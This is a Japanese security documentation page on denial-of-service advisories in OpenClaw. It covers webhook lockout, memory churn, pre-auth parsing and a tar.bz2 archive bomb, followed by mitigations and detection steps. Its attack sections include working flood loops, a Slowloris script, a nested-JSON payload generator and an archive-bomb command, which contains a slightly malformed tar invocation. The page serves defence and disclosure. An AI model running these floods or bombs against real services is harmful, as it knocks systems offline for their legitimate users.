# サービス妨害（DoS）

## 概要

サービス妨害（DoS: Denial of Service）脆弱性により、攻撃者はサーバーリソースを枯渇させ、正規ユーザーがサービスを利用できなくします。OpenClawでは、Webhook処理、メモリ枯渇、アーカイブ展開におけるDoS脆弱性が発見されており、サービス中断につながる可能性があります。

**影響**: サービス利用不可、リソース枯渇、本番システムの停止。

## 脆弱性リスト

### 中度（Medium）

| アドバイザリ | CVE | 概要 | 修正版 |
|----------|-----|------|--------|
| [GHSA-6rmx-gvvg-vh6j](https://github.com/openclaw/openclaw/security/advisories/GHSA-6rmx-gvvg-vh6j) | — | Webhook認証ロックアウトがPOST以外のリクエストもカウント | v2026.3.7 |
| [GHSA-wr6m-jg37-68xh](https://github.com/openclaw/openclaw/security/advisories/GHSA-wr6m-jg37-68xh) | — | Zalo Webhookクエリ文字列キーチャーンによるメモリ無制限増加（未認証DoS） | v2026.3.1 |
| [GHSA-x4vp-4235-65hg](https://github.com/openclaw/openclaw/security/advisories/GHSA-x4vp-4235-65hg) | — | Webhook本体パース（認証前）による遅延リクエストDoS | v2026.3.2 |
| [GHSA-77hf-7fqf-f227](https://github.com/openclaw/openclaw/security/advisories/GHSA-77hf-7fqf-f227) | — | skills-install-downloadのtar.bz2展開がアーカイブ安全チェックをバイパス（ローカルDoS） | v2026.3.2 |

**合計**: 4件のアドバイザリ（すべて中度）

## 攻撃シナリオ

### 1. 認証ロックアウトがPOST以外をカウント（GHSA-6rmx-gvvg-vh6j）

**攻撃ベクトル**: Webhookエンドポイントに対してPOST以外のリクエストを送信し、認証ロックアウトをトリガーしてレート制限リソースを枯渇させ、正規のWebhook処理をブロックします。

**例**:
```bash
# 攻撃者がWebhookにGETリクエストで攻撃
for i in {1..1000}; do
  curl -X GET http://openclaw:8080/webhook/telegram \
    -H "User-Agent: Mozilla/5.0"
done

# 各POST以外のリクエストが認証ロックアウトカウントに計上
# 正規のPOST Webhookがレート制限超過でブロック
# 攻撃者が正規Webhookペイロード送信なしでDoS達成
```

**影響**:
- Webhook処理ブロック
- 外部サービス連携中断
- 認証システムリソース枯渇
- 正規API呼び出し拒否

### 2. Zalo Webhookクエリ文字列キーチャーンによるメモリ無制限増加（GHSA-wr6m-jg37-68xh）

**攻撃ベクトル**: Zalo Webhookのクエリ文字列解析を悪用し、キーチャーンを通じたメモリ無制限増加（Out-of-Memory）クラッシュを引き起こします。

**例**:
```bash
# 攻撃者が数千の一意なクエリ文字列キーを持つWebhookを送信
curl "http://openclaw:8080/webhook/zalo?key1=val&key2=val&key3=val...&key10000=val" \
  -X POST -d '{"data":"webhook"}'

# 各一意キーに対してメモリ割り当て
# キーのクリーンアップやリミットなし
# OpenClawプロセスがOOMまでメモリ増加

# 複数リクエスト後:
# メモリ: 100MB → 500MB → 1GB → OOM → クラッシュ
```

**攻撃フロー**:
1. 攻撃者が毎回異なるクエリ文字列キーを持つWebhook送信
2. パーサーがクエリ文字列オブジェクトの各キーにメモリ割り当て
3. 古いキーのTTLやクリーンアップなし
4. メモリが複数Webhookリクエスト間で蓄積
5. プロセスが利用可能メモリを超過してクラッシュ

**影響**:
- Out-of-Memoryクラッシュ
- サービスシャットダウン
- Webhook処理停止
- マイクロサービス環境でのカスケード障害

### 3. Webhook本体解析（認証前）によるDoS（GHSA-x4vp-4235-65hg）

**攻撃ベクトル**: 認証前の高コスト解析操作（大規模JSON、深くネストされたオブジェクト）を持つ不正なWebhookペイロードを送信し、認証前エンドポイントで遅延リクエストDoSを引き起こします。

**例**:
```bash
# 攻撃者が解析に数秒かかる深くネストされたJSONを送信
PAYLOAD=$(python3 -c "
import json
obj = {}
curr = obj
for i in range(1000):
    curr['nested'] = {}
    curr = curr['nested']
curr['data'] = 'x' * 1000000  # 末尾に1MB文字列
print(json.dumps(obj))
")

curl http://openclaw:8080/webhook/generic \
  -X POST \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"

# パーサーがリクエストごとに10秒以上要する
# 複数並列リクエストがすべてスレッド/プロセスリソース消費
# 正規リクエストがタイムアウト
```

**攻撃パターン**:
- 大きなペイロードサイズ: 10MB以上のJSON
- 深いネスト: 1000以上レベルで指数関数的処理時間
- 文字列操作: 数百万文字の解析と検証
- 正規表現: 未検証の正規表現による破滅的なバックトラック

**影響**:
- スレッド/プロセスプール枯渇
- 正規リクエストがタイムアウト
- サーバー応答性低下
- ロードバランサー背後でのカスケード障害

### 4. tar.bz2抽出安全チェックバイパスDoS（GHSA-77hf-7fqf-f227）

**攻撃ベクトル**: 安全性チェックをバイパスするtar.bz2アーカイブを作成し、アーカイブボム（圧縮ファイルが膨大なサイズに展開）でローカルDoS引き起こします。

**例**:
```bash
# アーカイブボム作成（圧縮爆弾）
# 1.2MB圧縮 → 100GB以上に展開
dd if=/dev/zero bs=1M count=100000 | tar - | bzip2 > bomb.tar.bz2

# OpenClawスキルインストールにアップロード
openclaw skill install bomb.tar.bz2

# アーカイブがサイズ制限チェックなしで展開
# /tmp/extract/がディスク容量満杯
# OpenClawプロセスがファイルシステム満杯でクラッシュ
# 同じシステムの他サービスも影響
```

**アーカイブボム技術**:
1. **圧縮爆弾**: 単一の巨大ファイルを1000倍圧縮
2. **ネストボム**: ボム内のボム（tarの中のzipなど）
3. **スパースファイル**: 展開時に膨大に膨れるホール付きファイル
4. **シンボリックリンクチェーン**: 相互指すシンボリックリンクループ

**影響**:
- ディスク容量枯渇
- サービスクラッシュ
- ファイルシステム破損
- サービス間のカスケード障害
- 復旧の複雑性

## DoS一般的な攻撃技術

### HTTPフラッド
```bash
# 高量のHTTPリクエスト送信
ab -n 100000 -c 1000 http://openclaw:8080/webhook
```

### Slowloris（遅延リクエスト）
```bash
# ゆっくりリクエスト送信してコネクションプール枯渇
python3 -c "
import socket
for i in range(500):
    s = socket.socket()
    s.connect(('openclaw', 8080))
    s.send(b'GET / HTTP/1.1\r\nHost: localhost\r\n')
    # リクエスト完了しない
"
```

## 緩和策

### 1. レート制限とスロットリング

**HTTPリクエストレート制限**:
```javascript
const rateLimit = require('express-rate-limit');

// Webhookエンドポイントレート制限
const webhookLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1分
  max: 100, // 1分あたり最大100リクエスト
  // POSTリクエストのみカウント
  skip: (req) => req.method !== 'POST'
});

app.post('/webhook/:provider', webhookLimiter, handleWebhook);
```

**IP単位レート制限**:
```javascript
const ipLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分
  max: 1000,
  keyGenerator: (req) => req.ip
});
```

### 2. リクエストサイズとタイムアウト制限

**ボディサイズ制限**:
```javascript
// リクエストペイロードサイズ制限
app.use(express.json({ limit: '1mb' }));

// ファイルアップロードエンドポイント
app.post('/upload', express.json({ limit: '100mb' }), handleUpload);
```

**リクエストタイムアウト**:
```javascript
// グローバルタイムアウト
app.use((req, res, next) => {
  req.setTimeout(30000); // 30秒タイムアウト
  res.setTimeout(30000);
  next();
});
```

### 3. アーカイブ展開の安全性

**展開前のアーカイブ検証**:
```javascript
async function safeExtractArchive(filePath, maxSize = 1e9) {
  const tar = require('tar');
  const fs = require('fs');

  // 1. 圧縮ファイルサイズチェック
  const stats = fs.statSync(filePath);
  if (stats.size > maxSize) {
    throw new Error('Archive too large');
  }

  // 2. 展開制限設定
  const extract = tar.extract({
    cwd: extractDir,
    strict: true,
    preservePaths: false,
    maxExtractSize: maxSize,

    // 展開前に各ファイル検証
    onentry: (entry) => {
      if (entry.size > maxSize) {
        throw new Error('File too large');
      }
      if (entry.type === 'SymbolicLink' || entry.type === 'Link') {
        throw new Error('Symlinks not allowed');
      }
      // パストラバーサルチェック
      if (entry.name.includes('..')) {
        throw new Error('Path traversal detected');
      }
    }
  });

  return new Promise((resolve, reject) => {
    fs.createReadStream(filePath)
      .pipe(extract)
      .on('end', resolve)
      .on('error', reject);
  });
}
```

### 4. メモリとリソース制限

**Node.jsプロセス制限**:
```bash
# 最大ヒープサイズ設定
node --max-old-space-size=2048 app.js

# リソース制約
ulimit -m 2097152  # 2GBメモリ
ulimit -n 4096     # 4096ファイルディスクリプタ
```

### 5. クエリ文字列パラメータ制限

**パラメータ数制限**:
```javascript
app.use(express.urlencoded({
  parameterLimit: 50,  // 最大50パラメータ
  limit: '10kb'        // 最大10KBクエリ文字列
}));
```

### 6. ディスク容量監視

```bash
# ディスク使用率80%超過でアラート
df -h | awk '$5 > 80 {print "ALERT: Disk " $6 " is " $5 " full"}'

# 展開ディレクトリ監視
du -sh /tmp/extract/ | awk '{if ($1+0 > 10) print "ALERT: Extract dir too large"}'
```

### 7. OpenClawランタイムチェック

DoS保護ランタイムチェック有効化:

```bash
# Webhookレート制限有効化
openclaw config set webhook.rateLimit 100/minute

# ペイロードサイズ制限
openclaw config set webhook.maxPayloadSize 1mb

# 展開安全性設定
openclaw config set archive.maxExtractSize 1gb
openclaw config set archive.allowSymlinks false

# メモリ制限
openclaw config set process.maxHeapSize 2gb
```

詳細なDoS保護設定については[ハードニングガイド](../best-practices/hardening-guide.md)を参照してください。

## 検知

### リクエスト監視

```bash
# DoSパターン監視
tail -f /var/log/openclaw/webhook.log | \
  awk '{print $1}' | sort | uniq -c | sort -rn | head

# Webhookへの非POSTリクエスト確認
grep -c "GET /webhook" /var/log/openclaw/access.log

# 遅いリクエスト監視
grep "duration.*[0-9]\{4,\}ms" /var/log/openclaw/webhook.log
```

### 異常検知

- 突然のリクエスト量増加
- 異常に大きいペイロード
- 過度なクエリパラメータ
- 対応するアクティビティなしのメモリ使用率増加
- 30秒超のアーカイブ展開
- 単一IPからの反復リクエスト

## 関連リソース

- **脆弱性ドキュメント**:
  - [RCE脆弱性](./rce.md) - RCEがDoSにつながる可能性
  - [コマンドインジェクション](./command-injection.md) - 関連攻撃ベクトル
- **テスト**: DoSテストケースは`tests/`ディレクトリで利用可能
- **ベストプラクティス**:
  - [ハードニングガイド - リソース制限](../best-practices/hardening-guide.md)
  - [チャネルセキュリティ - レート制限](./channel-security.md)

## 参考情報

- **CWE-400**: 制御されないリソース消費（リソース枯渇）
- **CWE-779**: 過度なデータのログ記録
- **OWASP**: [サービス妨害](https://owasp.org/www-community/attacks/Denial_of_Service)
- **NIST**: DoS攻撃への対応
- **MITRE ATT&CK**: T1499（エンドポイント妨害）
